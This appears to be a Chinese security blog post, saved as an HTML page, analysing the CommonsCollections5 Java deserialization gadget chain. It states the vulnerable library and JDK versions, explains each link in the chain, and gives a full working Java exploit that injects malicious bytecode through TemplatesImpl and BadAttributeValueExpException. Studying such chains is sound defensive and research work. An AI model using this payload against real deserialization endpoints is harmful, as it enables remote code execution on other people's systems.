@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>CommonsCollections5利用链 | Wileysec&#39;s Blog</title>
+
+
+    <meta name="keywords" content="Java安全, CommonsCollections5">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="利用条件Commons-Collections 3.1 - 3.2.1版本 JDK版本：JDK8u301以下版本和JDK11版本可利用（需要关闭安全管理器，默认关闭） 利用链Gadget chain:     ObjectInputStream.readObject()         BadAttributeValueExpException.readObject()             T">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CommonsCollections5利用链">
+<meta property="og:url" content="https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/ab6a59d5d2e4.html">
+<meta property="og:site_name" content="Wileysec&#39;s Blog">
+<meta property="og:description" content="利用条件Commons-Collections 3.1 - 3.2.1版本 JDK版本：JDK8u301以下版本和JDK11版本可利用（需要关闭安全管理器，默认关闭） 利用链Gadget chain:     ObjectInputStream.readObject()         BadAttributeValueExpException.readObject()             T">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230818122321284.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230818123811466.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230818124836116.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230818125119318.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230818125549507.png">
+<meta property="article:published_time" content="2023-08-17T14:00:01.221Z">
+<meta property="article:modified_time" content="2023-08-25T16:47:45.087Z">
+<meta property="article:author" content="wileysec">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="CommonsCollections5">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wileysec.github.io/images/image-20230818122321284.png">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+    
+    
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/themes/prism-tomorrow.min.css" media="none" >
+        
+    
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/line-numbers/prism-line-numbers.min.css" media="none" onload="this.media='all'">
+    
+
+
+    
+    
+<link rel="stylesheet" href="/css/style/dark.css">
+
+    
+<script src="/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Wiley&#39;s Blog</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/links/" class="navbar-menu button">链接</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于我</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/links/" class="dropdown-menu button">链接</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于我</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        CommonsCollections5利用链
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2023/08/" class="post-meta__date button">文章创建于 2023-08-17</a>
+        
+    <span class="separate-dot"></span><a href="/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/" class="button">Java安全,技术分享</a>
+
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">利用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-text">BadAttributeValueExpException</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TiedMapEntry"><span class="toc-text">TiedMapEntry</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BEEXP%E7%BC%96%E5%86%99"><span class="toc-text">利用链EXP编写</span></a></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">Article Directory</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">利用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-text">BadAttributeValueExpException</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TiedMapEntry"><span class="toc-text">TiedMapEntry</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BEEXP%E7%BC%96%E5%86%99"><span class="toc-text">利用链EXP编写</span></a></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>Commons-Collections 3.1 - 3.2.1版本</p>
+<p>JDK版本：JDK8u301以下版本和JDK11版本可利用（需要关闭安全管理器，默认关闭）</p>
+<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre class="line-numbers language-none"><code class="language-none">Gadget chain:
+    ObjectInputStream.readObject()
+        BadAttributeValueExpException.readObject()
+            TiedMapEntry.toString()
+                LazyMap.get()
+                    ChainedTransformer.transform()
+						InstantiateTransformer.newTransformer()
+							TemplatesImpl.newTransformer()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p><img src="/images/image-20230818122321284.png" alt="image-20230818122321284"></p>
+<p><code>BadAttributeValueExpException</code> 类的父类的父类实现了 <code>Serializable</code> 接口，所以该类也是可被序列化的，查看该类的 <code>readObject</code> 方法</p>
+<p>这个反序列化方法调用了 <code>valObj.toString()</code> 方法，而这个 <code>valObj</code> 是我们可控的，其实就是获取了 <code>BadAttributeValueExpException</code> 类的 <code>val</code> 属性，这个我们可以通过构造方法传入进去或者通过反射设置值</p>
+<p><img src="/images/image-20230818123811466.png" alt="image-20230818123811466"></p>
+<p>虽然可以通过构造方法传入进去，但是为了避免在序列化时就被执行，所以需要通过反射来设置值</p>
+<p>在上面我们还注意到，判断了 <code>System.getSecurityManager()</code> 是否为null，如果有安全管理器这条链就不能被利用了，默认是没有的</p>
+<p>那么接下来就是要找哪个类的 <code>toString()</code> 方法可以实现一个利用链</p>
+<h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p><img src="/images/image-20230818124836116.png" alt="image-20230818124836116"></p>
+<p>在 <code>TiedMapEntry</code> 类中找到了有 <code>toString()</code> 方法，调用了 <code>getKey()</code> 和 <code>getValue()</code> 方法 </p>
+<p><img src="/images/image-20230818125119318.png" alt="image-20230818125119318"></p>
+<p>这里是不是感觉很熟悉呢？是的，和CC6里面很像，<code>getKey()</code> 方法只是返回了一个 <code>key</code> 属性，而 <code>getValue()</code> 方法调用了 <code>map</code> 属性的 <code>get()</code> 方法，那么我们只需要把确保这个 <code>map</code> 是 <code>LazyMap</code> 类对象，这样就能和CC1链一样，调用后续的 <code>transformer</code> 了</p>
+<p><img src="/images/image-20230818125549507.png" alt="image-20230818125549507"></p>
+<p>在 <code>LazyMap</code> 类的 <code>get()</code> 方法中调用了 <code>factory</code> 属性的 <code>transform()</code> 方法</p>
+<p>这样，我们就可以利用CC6的中间部分，然后加以修改，后面 <code>BadAttributeValueExpException</code> 类作为反序列化入口就可以执行恶意代码了</p>
+<p>在这里，我并没有使用CC1的前半段，而是使用了CC4的前半段，因为在有些场景中使用 <code>Transformer[]</code> 数组来进行反序列化，有时候数组处理不好的话会出错，所以尽量避免使用 <code>Transformer[]</code> 数组</p>
+<h2 id="利用链EXP编写"><a href="#利用链EXP编写" class="headerlink" title="利用链EXP编写"></a>利用链EXP编写</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections5</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/Users/wiley/IdeaProjects/javaResearch/src/main/java"</span> <span class="token operator">+</span>
+                <span class="token string">"/CommonsCollections/EvilCode.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Class</span> <span class="token class-name">TemplatesClass</span> <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> name <span class="token operator">=</span> <span class="token class-name">TemplatesClass</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> bytecodes <span class="token operator">=</span> <span class="token class-name">TemplatesClass</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bytecodes<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bytecodes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span>codes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">LazyMap</span> lazyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LazyMap</span><span class="token punctuation">)</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Class</span> badAttributeValueExpExceptionClass <span class="token operator">=</span> badAttributeValueExpException<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> valField <span class="token operator">=</span> badAttributeValueExpExceptionClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        valField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        valField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span>tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+    
+    <div class="post__license">
+        <p>
+            <strong>Author: </strong>wileysec
+        </p>
+        <p>
+            <strong>
+                Permalink: 
+            </strong>
+            <a href="https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/ab6a59d5d2e4.html">https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/ab6a59d5d2e4.html</a>
+        </p>
+        
+    </div>
+ 
+    <div class="post-footer__meta"><p>文章更新于 2023-08-26</p></div> 
+    <div class="post-entry__tags"><a href="/tags/Java%E5%AE%89%E5%85%A8/" class="post-tags__link button"># Java安全</a><a href="/tags/CommonsCollections5/" class="post-tags__link button"># CommonsCollections5</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+                <a href="/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/64a620f796b4.html" class="nav__link">
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
+                    </div>
+                    <div>
+                        <div class="nav__label">
+                            Previous Post
+                        </div>
+                        <div class="nav__title">
+                            CommonsCollections7利用链
+                        </div>
+                    </div>
+                </a>
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/6071e76d7b09.html" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            CommonsCollections4利用链
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments post__with-toc content-card" id="comment">
+        
+    <h4>Comments</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+    </div>
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2023 <a href="/">Wileysec&#39;s Blog</a>
+        </p>
+    
+    
+    <p><a href="https://beian.miit.gov.cn/" target="_blank">皖ICP备18006273号-1</a></p>
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+    <p></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('false'),
+            auto_fancybox = Boolean('false')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+    
+
+    
+
+    
+    
+    <script>
+        function loadComment() {
+            let e;
